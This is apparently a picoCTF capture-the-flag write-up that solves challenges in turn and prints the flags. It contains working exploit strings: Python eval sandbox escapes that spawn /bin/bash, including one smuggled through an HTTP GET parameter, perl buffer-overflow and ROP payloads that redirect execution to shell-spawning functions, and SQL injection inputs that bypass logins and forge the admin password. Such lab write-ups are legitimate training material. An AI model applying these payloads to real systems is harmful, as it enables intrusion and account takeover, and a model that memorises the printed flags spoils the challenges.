## Failure to boot

By guessing you get the flag

```
sda1 .. fail!
fat32.. success!
```

## Read the manual

I have coded ROT-* solver long time ago.. so I tried ROT-* solve and solved this problem.

Decrypted Text:
`IMPORTANT: To enter automatic recovery mode, enter the following recovery key cbcfebeaeeed"`

## XMLOL
You just need to download xml file and open with notepad. But i tried with view-source way.
view-source:https://picoctf.com/problems/xmlol.xml
This flag code was written on the xml file:
`<super_secret_flag>d6b6aba9c44bf3dd58809c46e2c0ffba</super_secret_flag>`

## Technician Challenge
Search about geohot using google and you will find the answer.
I don't exactly remember, but the key is Nissan ~~~

## First Contact
just look through the hex-codes of the pcap file you will find the answer :)

## Python eval 1
`nc python.picoctf.com 6361`
I didnt use eval to do it, because it's still possible to do with an easy math calculation.

## Python eval 2
`nc python.picoctf.com 6362`
the point is that you have to use eval and get the flag.
so I tried the exploit which is shown below:
```
guess> (len(flag), randint(0,9), randint(0,9), randint(0,9), randint(0,9))
guess> (str(flag[:25]), randint(0,9), randint(0,9), randint(0,9), randint(0,9))
i_are_a_pyeval_mastermind
```

## Python eval 3
`nc python.picoctf.com 6363`
__import__ is disabled but you find the working path.
```
> path.os.execl("/bin/bash", "")
cat your_flag_here
eval_is_super_OSsome
```

## Python eval 4
nc python.picoctf.com 6364
	
if GET params like "foo=bar" is sent to server, server will put the get param as {"a":"b"}
so by escaping from the brackets and quote sign, you can execute /bin/sh/ successfully.
```
GET /index.html?a=b"+input(path.os.execl("/bin/sh",""))+"a HTTP/1.1
Host: python.picoctf.com:6364
Connection: keep-alive
cat super_awesome_flag
kids_dont_code_like_this_at_home
```

## harder_serial
just keep your eyes open and understand each lines of the code. 
hint: look for the statement that starts from * 0.
42813724579039578812

## Overflow1
Well, it was easier then expected.
We just need to put variable \x01.
since the variable was before the buffer, I tried
./simple_overwrite $(perl -e 'print "\x41"x64 . "\x01";')

## Overflow2
it was similar question as overflow1, but the variable was little far away.
By using this code below, you can set the variable by overwriting stack.
./stack_overwrite $(perl -e 'print "\x41"x80 . "\x01";')

## Overflow3
The question is to call not_called function, which is from 0x080485f8.
so by using this code below, I have called the function and got the shell.
./buffer_overflow $(perl -e 'print "\x41"x76 . "\xf8\x85\x04\x08";')

## ROP1
The question was to call the function, so..
cat <(perl -e 'print "\x41"x36 . "AAAA" . "\xa4\x84\x04\x08"') - | ./rop1

## ROP2
As the question says, we have to put /bin/bash to the system function.
So, the payload should be something like below:
```
["a"*128][bbbb][&system][cccc][&"/bin/bash"]
But, I couldn't make it successful.
cat <(perl -e 'print "\x41"x128 . "BBBB" . "\xb1\x84\x04\x08" . "CCCC" . "\xa0\x84\x04\x08";') - | ./rop2
```

## Chromatophoria
Painted the background with black color and gotcha!

## GETKey
there's nothing much to do in this question.
if you look at carefully at GET param, which is foo.php?getparam=blah,
you will figure out that the admin param is false and other one is ccdc
so if you change admin param to true and other one as pico or picoctf, you get the right answer.

## Injection
the question seem to be having eregi function to disallow access for the admin.
so, i inserted guest'='guest as userid, in which all the user will be fetched out.
at the end, I got all the userid and the password at one page including the password for the admin :0

## PHP3
this was the md5-based sql injection
the point is that the bug exists in PHP
I don't want to waste my time bruteforcing for the exploit.
so I googled for the code and got the answer using the code from leetctf 2010.

## PHP4
well, again it's the sql injection.
I did the blind sql injection, and the password for admin was 'notarealhash'
so i figured out that you have to make the sql output as the password you want.
so, I used this sql code below as userid so that the password is md5('test');
```' AND 1=0 UNION SELECT '098f6bcd4621d373cade4e832627b4f6'# ```
and password as test. I successfully got the answer.
r